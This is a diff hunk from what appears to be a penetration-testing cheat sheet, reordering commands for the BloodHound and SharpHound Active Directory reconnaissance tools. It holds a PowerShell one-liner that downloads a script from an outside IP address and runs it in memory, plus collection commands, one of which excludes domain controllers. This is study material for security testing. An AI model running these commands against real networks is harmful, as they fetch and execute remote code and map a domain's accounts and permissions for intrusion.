@@ -813,16 +813,15 @@ bloodhound-python -u username -p password -dc xx.aa.com --disable-auto-gc -d aa.
 ##### BLOODHOUND - POWERSHELL
 ```
 IEX (New-Object System.Net.WebClient).DownloadString("http://175.12.80.10:8080/SharpHound.ps1")
-Invoke-BloodHound 
-invoke-Bloodhound -collectionmethod all
 ```
 ```
 curl https://github.com/n0ts0cial/oscp/raw/main/SharpHound.ps1  -Outfile SharpHound.ps1
 import-module .\SharpHound.ps1
 ```
-
 ```
-INvoke-Bloodhound -Collectionmethod All
+Invoke-BloodHound 
+Invoke-Bloodhound -collectionmethod all
+Invoke-Bloodhound -collectionmethod all -excludedc
 Invoke-BloodHound -CollectionMethod ACL,ObjectProps
 -CompressData -RemoveCSV and -NoSaveCache   --GERAR O ARQUIVO ZIP PARA ARRASRTAR NO BLOODHOUND
 ```
